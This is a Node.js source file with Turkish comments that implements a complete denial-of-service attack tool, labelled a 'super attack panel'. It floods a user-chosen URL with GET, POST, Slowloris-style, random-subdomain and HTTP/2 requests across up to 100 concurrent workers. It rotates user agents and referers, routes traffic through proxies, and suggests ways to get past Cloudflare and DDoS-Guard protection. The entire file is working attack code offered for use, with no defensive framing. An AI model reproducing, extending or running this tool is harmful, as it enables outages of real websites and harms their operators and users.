// Gerekli modüller
const fs = require('fs').promises;
const readline = require('readline');
const crypto = require('crypto');
const http2 = require('http2'); // HTTP/2 için

// Axios’u dinamik yükle
let axios;
try {
    axios = require('axios').default;
} catch {
    console.error('Hata: "axios" modülü eksik! Kur: npm install axios');
    process.exit(1);
}

// Colors opsiyonel
let colors;
try {
    colors = require('colors');
} catch {
    colors = {
        green: s => s,
        cyan: s => s,
        red: s => s,
        yellow: s => s,
        rainbow: { bold: s => s },
    };
}

// Basit konsol mesajı
function logStatus(message, color) {
    console.log(colors[color || 'white'](message));
}

// Kullanıcı ajanları (daha fazla çeşit)
var userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
];

// Referer’lar
var referers = ['https://google.com', 'https://bing.com', 'https://youtube.com', 'https://facebook.com'];

// Proxy’ler
var proxies = [];

// Readline arayüzü
var rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

// Proxy yükleyici ve doğrulama
async function loadProxies() {
    logStatus('Proxy’ler yükleniyor...', 'cyan');
    try {
        var data = await fs.readFile('proxies.txt', 'utf8');
        proxies = data.split('\n').filter(function(line) {
            var trimmed = line.trim();
            return trimmed && trimmed.match(/^\d+\.\d+\.\d+\.\d+:\d+$/);
        });
        if (proxies.length === 0) {
            logStatus('Geçerli proxy bulunamadı, direkt bağlanılıyor.', 'yellow');
        } else {
            logStatus(proxies.length + ' proxy yüklendi!', 'green');
            // Proxy testi
            for (let i = proxies.length - 1; i >= 0; i--) {
                if (!(await testProxy(proxies[i]))) {
                    logStatus(`Proxy ${proxies[i]} çalışmıyor, listeden çıkarılıyor.`, 'yellow');
                    proxies.splice(i, 1);
                }
            }
            logStatus(`Kalan aktif proxy: ${proxies.length}`, 'green');
        }
    } catch (err) {
        logStatus('Proxy dosyası okunamadı: ' + (err.message || 'Bilinmeyen hata') + '. Direkt bağlanılıyor.', 'yellow');
    }
}

// Proxy testi
async function testProxy(proxy) {
    try {
        var [host, port] = proxy.split(':');
        await axios.get('https://api.ipify.org', {
            proxy: { host, port: parseInt(port) },
            timeout: 3000,
        });
        return true;
    } catch {
        return false;
    }
}

// Rastgele seçim
function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
function getRandomQuery() {
    return '?r=' + Math.random().toString(36).slice(2);
}
function getRandomPath() {
    return '/p' + Math.random().toString(36).slice(2, 10);
}
function randomDelay() {
    return new Promise(function(resolve) {
        setTimeout(resolve, crypto.randomInt(10, 200)); // Daha hızlı istek
    });
}

// Rastgele subdomain
function getRandomSubdomain(url) {
    if (Math.random() > 0.8) return url;
    try {
        var host = url.split('/')[2];
        var proto = url.split('/')[0];
        if (host && host.includes('.')) {
            return proto + '//' + Math.random().toString(36).slice(2, 8) + '.' + host;
        }
        return url;
    } catch {
        return url;
    }
}

// URL doğrulama
async function validateUrl(url) {
    try {
        await axios.head(url, { timeout: 5000, maxRedirects: 10 });
        return true;
    } catch (err) {
        if (err.code === 'ENOTFOUND') {
            throw new Error('URL bulunamadı! Doğru yazdığınızdan emin olun (örn: http://example.com).');
        }
        if (err.message.includes('redirect')) {
            throw new Error('URL çok fazla yönlendirme yapıyor! Doğru URL’yi kontrol edin.');
        }
        return false;
    }
}

// HTTP/2 Flood (yeni method)
async function sendHttp2Request(targetUrl, cookies) {
    try {
        var client = http2.connect(targetUrl, { timeout: 10000 });
        var headers = {
            ':path': getRandomPath(),
            ':method': 'GET',
            'user-agent': getRandom(userAgents),
            'accept': 'text/html,application/xhtml+xml',
            'referer': getRandom(referers),
        };
        if (cookies && Object.keys(cookies).length) {
            headers['cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        }

        var req = client.request(headers);
        req.setTimeout(10000);

        return new Promise((resolve) => {
            req.on('response', (headers) => {
                var status = headers[':status'] || 0;
                resolve({
                    success: status < 400 || [403, 503].includes(status),
                    status: status,
                    cookies: cookies,
                });
            });
            req.on('error', () => {
                resolve({ success: false, error: 'HTTP/2 bağlantı hatası', cookies });
            });
            req.on('timeout', () => {
                resolve({ success: false, error: 'HTTP/2 timeout', cookies });
            });
            req.end();
        }).finally(() => client.close());
    } catch {
        return { success: false, error: 'HTTP/2 başlatma hatası', cookies };
    }
}

// HTTP isteği
async function sendRequest(targetUrl, cookies, method) {
    if (!cookies) cookies = {};
    if (!method) method = 'GET';

    var headers = {
        'User-Agent': getRandom(userAgents),
        'Accept': getRandom(['text/html,application/xhtml+xml', 'application/json', '*/*']),
        'Accept-Language': getRandom(['en-US,en;q=0.9', 'tr-TR,tr;q=0.8']),
        'Referer': getRandom(referers),
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1', // Do Not Track
        'Upgrade-Insecure-Requests': '1',
    };

    if (Object.keys(cookies).length) {
        try {
            headers['Cookie'] = Object.entries(cookies).map(function([k, v]) {
                return k + '=' + v;
            }).join('; ');
        } catch {
            logStatus('Çerez işleme hatası, devam ediliyor.', 'yellow');
        }
    }

    var config = {
        headers: headers,
        timeout: 10000,
        maxRedirects: 10,
        validateStatus: function() { return true; },
    };

    // Proxy desteği
    var proxy = getRandom(proxies);
    if (proxy) {
        try {
            var proxyParts = proxy.split(':');
            if (proxyParts.length === 2) {
                config.proxy = {
                    host: proxyParts[0],
                    port: parseInt(proxyParts[1]),
                };
            }
        } catch {
            logStatus('Proxy formatı hatalı: ' + proxy + '. Direkt bağlanılıyor.', 'yellow');
        }
    }

    try {
        var url = targetUrl;
        if (method === 'SUBDOMAIN') url = getRandomSubdomain(targetUrl);
        url = url + (Math.random() > 0.5 ? getRandomQuery() : getRandomPath());

        var response;
        if (method === 'POST') {
            response = await axios.post(url, { data: crypto.randomBytes(16).toString('hex') }, config);
        } else if (method === 'SLOWLORIS') {
            await randomDelay();
            response = await axios.get(url, Object.assign({}, config, { timeout: 30000 }));
        } else if (method === 'HTTP2') {
            return await sendHttp2Request(targetUrl, cookies);
        } else {
            response = await axios.get(url, config);
        }

        var newCookies = cookies;
        if (response.headers && response.headers['set-cookie']) {
            try {
                newCookies = response.headers['set-cookie'].reduce(function(acc, cookie) {
                    var keyValue = cookie.split(';')[0];
                    var parts = keyValue.split('=');
                    if (parts.length >= 2) {
                        var key = parts[0];
                        var value = parts[1];
                        acc[key] = value;
                    }
                    return acc;
                }, cookies);
            } catch {
                logStatus('Çerez ayrıştırma hatası, mevcut çerezler kullanılıyor.', 'yellow');
            }
        }

        return {
            success: response.status < 400 || [403, 503].includes(response.status),
            status: response.status || 'Bilinmeyen',
            cookies: newCookies,
        };
    } catch (error) {
        var errorMsg = error.message || 'Bağlantı hatası';
        if (error.code === 'ENOTFOUND') {
            errorMsg = 'DNS hatası: URL veya subdomain bulunamadı';
        } else if (error.message.includes('redirect')) {
            errorMsg = 'Yönlendirme limiti aşıldı: URL veya proxy’yi kontrol edin';
        } else if (error.code === 'ECONNREFUSED') {
            errorMsg = 'Bağlantı reddedildi: Hedef veya proxy engelliyor';
        }
        return {
            success: false,
            error: errorMsg,
            cookies: cookies
        };
    }
}

// Kullanıcı girişi
async function getUserInput() {
    console.clear();
    console.log('\n🌟 ' + colors.rainbow.bold('SÜPER SALDIRI PANELI v2') + ' 🌟');
    console.log(colors.cyan('Method seç:'));
    console.log(colors.green('1 - GET Flood (Hızlı, Genel)'));
    console.log(colors.green('2 - POST Flood (Form, Veri Yoğun)'));
    console.log(colors.green('3 - Slowloris (Yavaş, Bağlantı Tüketir)'));
    console.log(colors.green('4 - Subdomain (Cache Bypass)'));
    console.log(colors.green('5 - HTTP/2 Flood (Modern Siteler)'));
    console.log(colors.green('6 - Karışık (Hepsi)'));
    var methodNum = await new Promise(function(resolve) {
        rl.question(colors.cyan('Seçim (1-6): '), function(answer) {
            resolve(answer.trim());
        });
    });
    var methodMap = {
        '1': 'GET',
        '2': 'POST',
        '3': 'SLOWLORIS',
        '4': 'SUBDOMAIN',
        '5': 'HTTP2',
        '6': 'MIXED'
    };
    var method = methodMap[methodNum] || 'GET';
    if (!methodMap[methodNum]) {
        logStatus('Geçersiz method seçimi, varsayılan: GET', 'yellow');
    }

    var url = await new Promise(function(resolve) {
        rl.question(colors.cyan('Hedef URL (örn: https://example.com): '), function(answer) {
            resolve(answer.trim());
        });
    });
    if (!url.match(/^https?:\/\/[^/]+/)) {
        throw new Error('Geçerli bir URL gir (örn: https://example.com)!');
    }

    // URL’yi doğrula
    try {
        await validateUrl(url);
    } catch (err) {
        throw err;
    }

    var duration = await new Promise(function(resolve) {
        rl.question(colors.cyan('Süre (saniye, örn: 60): '), function(answer) {
            resolve(answer.trim());
        });
    });
    var parsedDuration = parseInt(duration);
    if (isNaN(parsedDuration) || parsedDuration < 1 || parsedDuration > 3600) {
        throw new Error('Süre 1-3600 saniye arasında olmalı (örn: 60)!');
    }

    var threads = await new Promise(function(resolve) {
        rl.question(colors.cyan('Thread (örn: 20): '), function(answer) {
            resolve(answer.trim());
        });
    });
    var parsedThreads = parseInt(threads);
    if (isNaN(parsedThreads) || parsedThreads < 1 || parsedThreads > 100) {
        throw new Error('Thread 1-100 arasında olmalı (örn: 20)!');
    }

    return {
        method: method,
        url: url,
        duration: parsedDuration,
        threads: parsedThreads
    };
}

// Ana fonksiyon
async function megaBypassAttack(input) {
    var method = input.method;
    var url = input.url;
    var duration = input.duration;
    var threads = input.threads;

    await loadProxies();
    console.clear();
    console.log('\n⚡ ' + colors.rainbow.bold('SALDIRI BAŞLADI!') + ' ⚡');
    console.log(colors.cyan('🔗 Hedef: ' + url));
    console.log(colors.cyan('⏰ Süre: ' + duration + 's'));
    console.log(colors.cyan('⚙️ Thread: ' + threads));
    console.log(colors.cyan('🔥 Method: ' + method));

    logStatus('Hazırlanıyor...', 'cyan');
    var endTime = Date.now() + duration * 1000;
    var successCount = 0;
    var failCount = 0;
    var cookies = {};

    async function worker() {
        while (Date.now() < endTime) {
            try {
                await randomDelay();
                var selectedMethod = method === 'MIXED' ? getRandom(['GET', 'POST', 'SLOWLORIS', 'SUBDOMAIN', 'HTTP2']) : method;
                var result = await sendRequest(url, cookies, selectedMethod);
                cookies = result.cookies;

                if (result.success) {
                    successCount++;
                    process.stdout.write(colors.green('[+] ' + result.status + ' '));
                } else {
                    failCount++;
                    var errorMsg = typeof result.error === 'string' ? result.error.slice(0, 20) : 'Bilinmeyen hata';
                    process.stdout.write(colors.red('[-] ' + errorMsg + ' '));
                }
            } catch (err) {
                failCount++;
                process.stdout.write(colors.red('[-] İşlem hatası '));
            }
        }
    }

    var workers = [];
    for (var i = 0; i < threads; i++) {
        workers.push(worker());
    }
    logStatus('Saldırı aktif!', 'green');
    try {
        await Promise.all(workers);
    } catch (err) {
        logStatus('Worker hatası: ' + (err.message || 'Bilinmeyen hata'), 'red');
    }

    console.log('\n🎉 ' + colors.rainbow.bold('BİTTİ!') + ' 🎉');
    console.log(colors.green('✅ Başarılı: ' + successCount));
    console.log(colors.red('❌ Hata: ' + failCount));
    if (successCount < failCount / 2) {
        console.log(colors.yellow('⚠️ Düşük başarı oranı! Öneriler:'));
        console.log(colors.yellow('- Premium proxy kullanın (Smartproxy, Oxylabs).'));
        console.log(colors.yellow('- Thread sayısını artırın (örn: 50).'));
        console.log(colors.yellow('- HTTP/2 veya Slowloris deneyin.'));
        console.log(colors.yellow('- Hedefin korumasını kontrol edin (Cloudflare, DDoS-Guard).'));
    }
}

// Çalıştır
(function() {
    try {
        getUserInput().then(function(input) {
            return megaBypassAttack(input);
        }).catch(function(err) {
            console.error(colors.red('Hata: ' + (err.message || 'Bilinmeyen hata')));
        }).finally(function() {
            rl.close();
        });
    } catch (err) {
        console.error(colors.red('Başlatma hatası: ' + (err.message || 'Bilinmeyen hata')));
        rl.close();
    }
})();